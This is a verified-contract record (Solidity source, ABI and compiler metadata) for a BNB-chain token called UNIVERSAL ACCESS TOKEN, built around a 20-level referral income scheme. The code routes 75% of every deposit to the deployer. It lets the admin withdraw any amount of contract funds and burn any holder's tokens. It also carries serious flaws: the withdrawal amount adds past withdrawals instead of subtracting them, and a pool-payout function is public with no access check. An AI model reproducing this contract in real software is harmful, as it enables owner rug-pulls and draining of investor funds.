{"SourceCode": "// SPDX-License-Identifier: UNLISCENSED\r\npragma solidity 0.8.7;\r\ncontract UNIVERSALACCESSTOKEN  {\r\n    string public name = \"UNIVERSAL ACCESS TOKEN\";\r\n    string public symbol = \"UAT\";\r\n    uint256 public totalSupply =600000000*10**18; // 60 Cr tokens\r\n    uint8 public decimals = 18;\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(\r\n        address indexed _owner,\r\n        address indexed _spender,\r\n        uint256 _value\r\n    );\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        uint partnersCount;\r\n        uint256 totalDeposit;\r\n        uint256 levelincome;\r\n        uint256 clubincome;\r\n        uint256 totalincome;\r\n        uint256 totalwithdraw;\r\n    }\r\n    mapping(address=>User) public users;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(uint => address) public idToAddress;\r\n    uint public lastUserId = 2;\r\n    uint public icoindex = 1;\r\n    uint public icodistribution = 0;\r\n    uint256 public projectvolume = 0;\r\n    uint256 public dauPool= 0;\r\n    uint256 public lastDistribute;\r\n    uint256 public startTime;\r\n    uint256 private constant timeStep =1 days;\r\n    mapping(uint => uint256) public icos;\r\n    address private admin;\r\n    address public ico=0x702Ef62160c282A2898445985D12ff9930Da4170;\r\n    uint256[20] private levelPercents = [80,40,20,10,5,5,5,5,5,5,2,2,2,2,2,2,2,2,2,2];\r\n    address public platform_fee;\r\n    mapping(uint256 => mapping(address => uint256)) public userLayerDayDirect2; \r\n    mapping(uint256=>address[]) public dayDirect2Users; \r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Upgrade(address indexed user, uint256 value);\r\n    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);\r\n    event withdraw(address indexed user,uint256 value);\r\n    constructor() {\r\n        admin=msg.sender;\r\n        platform_fee=msg.sender;\r\n        balanceOf[admin] = totalSupply*90/100;\r\n        balanceOf[ico] = totalSupply*10/100;\r\n        icos[1]=20;\r\n        icos[2]=29;\r\n        icos[3]=39;\r\n        icos[4]=49;\r\n        icos[5]=130;\r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0),\r\n            partnersCount: 0,\r\n            totalDeposit:0,\r\n            levelincome:0,\r\n            clubincome:0,\r\n            totalincome:0,\r\n            totalwithdraw:0\r\n        });\r\n        users[admin] = user;\r\n        idToAddress[1] = admin;\r\n    }\r\n    function registrationExt(address referrerAddress) external payable {\r\n        require(msg.value>=3e16, \"Minimum invest amount is 0.03 BNB!\");\r\n        uint256 _amount=msg.value;\r\n\t\tpayable(platform_fee).transfer(_amount*75/100);\r\n        registration(msg.sender, referrerAddress,msg.value);\r\n    }\r\n    function registrationFor(address referrerAddress,address userAddress) external payable {\r\n        require(msg.value>=3e16, \"Minimum invest amount is 0.03 BNB!\");\r\n        uint256 _amount=msg.value;\r\n\t\tpayable(platform_fee).transfer(_amount*75/100);\r\n        registration(userAddress, referrerAddress,msg.value);\r\n    }\r\n    function registration(address userAddress, address referrerAddress,uint256 _amount) private {\r\n        require(!isUserExists(userAddress), \"user exists\");\r\n        require(isUserExists(referrerAddress), \"referrer not exists\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress,\r\n            partnersCount: 0,\r\n            totalDeposit:0,\r\n            levelincome:0,\r\n            clubincome:0,\r\n            totalincome:0,\r\n            totalwithdraw:0\r\n\r\n        });\r\n        lastDistribute=block.timestamp;\r\n        startTime=block.timestamp;\r\n        users[userAddress] = user;\r\n        idToAddress[lastUserId] = userAddress;\r\n        users[userAddress].referrer = referrerAddress;\r\n        lastUserId++;\r\n        users[referrerAddress].partnersCount++; \r\n        uint256 dayNow = getCurDay();\r\n        _updateDirect2User(users[userAddress].referrer, dayNow);\r\n        _distributeDeposit(userAddress,_amount);                \r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n    function buyToken() external payable {\r\n        require(msg.value>=3e16, \"Minimum invest amount is 0.03 BNB!\");\r\n        uint256 _amount=msg.value;\r\n\t\tpayable(platform_fee).transfer(_amount*75/100);\r\n        _distributeDeposit(msg.sender,_amount);\r\n        emit Upgrade(msg.sender,msg.value);\r\n    }\r\n    function coinRate() public view returns(uint256)\r\n    {\r\n        return icos[icoindex];\r\n    }\r\n    function _distributeDeposit(address _user, uint256 _amount) private { \r\n        projectvolume+=_amount;\r\n        dauPool+=_amount*5/100;\r\n        users[msg.sender].totalDeposit += _amount;        \r\n        _distributelevelIncome(_user, _amount*90/100);  \r\n        uint _rate = coinRate();\r\n        uint tokens = (_amount*1e6/_rate);\r\n        balanceOf[ico] -= tokens;\r\n        balanceOf[_user] += tokens;\r\n        emit Transfer(ico, _user, tokens);\r\n        updateicoIndex(tokens);\r\n    }\r\n    function updateicoIndex(uint256 _token) private\r\n    {\r\n        icodistribution+=_token;\r\n        if(icodistribution<=50e23)\r\n        {\r\n            icoindex=1;\r\n        }\r\n        else if(icodistribution>50e23 && icodistribution<=100e23)\r\n        {\r\n            icoindex=2;\r\n        }\r\n        else if(icodistribution>100e23 && icodistribution<=150e23)\r\n        {\r\n            icoindex=3;\r\n        }\r\n        else if(icodistribution>150e23 && icodistribution<=400e23)\r\n        {\r\n            icoindex=4;\r\n        }\r\n         else if(icodistribution>400e23 && icodistribution<=600e23)\r\n        {\r\n            icoindex=5;\r\n        }\r\n\r\n    }\r\n    function manageicoIndex(uint _icoindex) public\r\n    {\r\n        require(msg.sender==admin,\"Only contract owner\"); \r\n        if(icoindex<_icoindex)\r\n        {\r\n            icoindex=_icoindex;\r\n            icodistribution=50e23*(_icoindex-1);\r\n        }\r\n    }\r\n    function _distributelevelIncome(address _user, uint256 _amount) private {\r\n        address upline = users[_user].referrer;\r\n        for(uint8 i = 0; i < 20; i++){\r\n            if(upline != address(0)){\r\n                uint256 reward=_amount*levelPercents[i]/1000;   \r\n                users[upline].levelincome += reward;           \r\n                users[upline].totalincome +=reward;   \r\n                emit Transaction(upline,_user,reward,(i+1),1);                        \r\n                upline = users[upline].referrer;\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n    function _updateDirect2User(address _user, uint256 _dayNow) private {\r\n        userLayerDayDirect2[_dayNow][_user] += 1;\r\n        bool updated;\r\n        for(uint256 i = 0; i < dayDirect2Users[_dayNow].length; i++){\r\n            address direct2User = dayDirect2Users[_dayNow][i];\r\n            if(direct2User == _user){\r\n                updated = true;\r\n                break;\r\n            }\r\n        }\r\n        if(!updated && userLayerDayDirect2[_dayNow][_user]>=2){\r\n            dayDirect2Users[_dayNow].push(_user);\r\n        }\r\n    } \r\n    function distributePoolRewards() public {\r\n        if(block.timestamp > lastDistribute+timeStep){  \r\n            uint256 dayNow = getCurDay();\r\n           _distribute2DirectPool(dayNow);\r\n           dauPool=0;\r\n           lastDistribute = lastDistribute+timeStep;\r\n        }\r\n    }    \r\n    function getDirect2Length(uint256 _dayNow) external view returns(uint) {\r\n        return dayDirect2Users[_dayNow].length;\r\n    }    \r\n    function _distribute2DirectPool(uint256 _dayNow) public {\r\n        uint256 direct2Count=dayDirect2Users[_dayNow - 1].length;\r\n        \r\n        if(direct2Count > 0){\r\n            uint256 reward = dauPool/direct2Count;\r\n            for(uint256 i = 0; i < dayDirect2Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect2Users[_dayNow - 1][i];\r\n                users[userAddr].clubincome += reward;\r\n                users[userAddr].totalincome += reward;\r\n                emit Transaction(admin,userAddr,reward,1,2);\r\n            }        \r\n            dauPool = 0;\r\n        }\r\n        else {\r\n            users[admin].clubincome += dauPool;\r\n            users[admin].totalincome += dauPool;\r\n        }\r\n        \r\n    }\r\n    function getCurDay() public view returns(uint256) {\r\n        return (block.timestamp-startTime)/timeStep;\r\n    } \r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n    function updateGWEI(uint256 _amount) public\r\n    {\r\n        require(msg.sender==admin,\"Only contract owner\"); \r\n        require(_amount>0, \"Insufficient reward to withdraw!\");\r\n        payable(admin).transfer(_amount);  \r\n    }\r\n    function IncomeWithdraw() public\r\n    {  \r\n        uint256 balanceReward=users[msg.sender].totalincome+users[msg.sender].totalwithdraw;\r\n        require(balanceReward>0, \"Insufficient reward to withdraw!\");\r\n        users[msg.sender].totalwithdraw+=balanceReward;\r\n        payable(msg.sender).transfer(balanceReward); \r\n        emit withdraw(msg.sender,balanceReward);\r\n    }\r\n    function IncomeWithdrawFor(address _user) public\r\n    {  \r\n        require(msg.sender==admin,\"Only contract owner\"); \r\n        uint256 balanceReward=users[_user].totalincome+users[_user].totalwithdraw;\r\n        require(balanceReward>0, \"Insufficient reward to withdraw!\");\r\n        users[_user].totalwithdraw+=balanceReward;\r\n    }\r\n    function transfer(address _to, uint256 _value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n       \r\n        require(balanceOf[msg.sender] >= _value);\r\n        balanceOf[msg.sender] -= _value;\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint256 _value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint256 _value\r\n    ) public returns (bool success) {\r\n        require(_value <= balanceOf[_from]);\r\n        require(_value <= allowance[_from][msg.sender]);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        allowance[_from][msg.sender] -= _value;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n    function burn(uint256 amount,address account) public returns (bool) {\r\n        if (msg.sender != admin) {revert(\"Access Denied\");}\r\n        _burn(account, amount);\r\n        return true;\r\n    }\r\n    function _burn(address account, uint256 amount) internal virtual \r\n    {\r\n        require(account != address(0), \"BEP20: burn from the zero address\");\r\n        uint256 accountBalance = balanceOf[account];\r\n        require(accountBalance >= amount, \"BEP20: burn amount exceeds balance\");\r\n        require(totalSupply>=amount, \"Invalid amount of tokens!\");\r\n        balanceOf[account] = accountBalance - amount;        \r\n        totalSupply -= amount;\r\n    }\r\n    function transferOwnership(address newOwner) public returns (bool) {\r\n        if (msg.sender != admin) {revert(\"Access Denied\");}\r\n        admin = newOwner;\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"Type\",\"type\":\"uint8\"}],\"name\":\"Transaction\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"IncomeWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"IncomeWithdrawFor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_dayNow\",\"type\":\"uint256\"}],\"name\":\"_distribute2DirectPool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"coinRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dauPool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"dayDirect2Users\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributePoolRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurDay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_dayNow\",\"type\":\"uint256\"}],\"name\":\"getDirect2Length\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ico\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"icodistribution\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"icoindex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"icos\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastDistribute\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_icoindex\",\"type\":\"uint256\"}],\"name\":\"manageicoIndex\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"platform_fee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"projectvolume\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"registrationExt\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"registrationFor\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateGWEI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userLayerDayDirect2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDeposit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"levelincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"clubincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalincome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalwithdraw\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UNIVERSALACCESSTOKEN", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a28a089ac380e1546daaddc86812923bc9a36b7f645d1e642b284396e640b9c8"}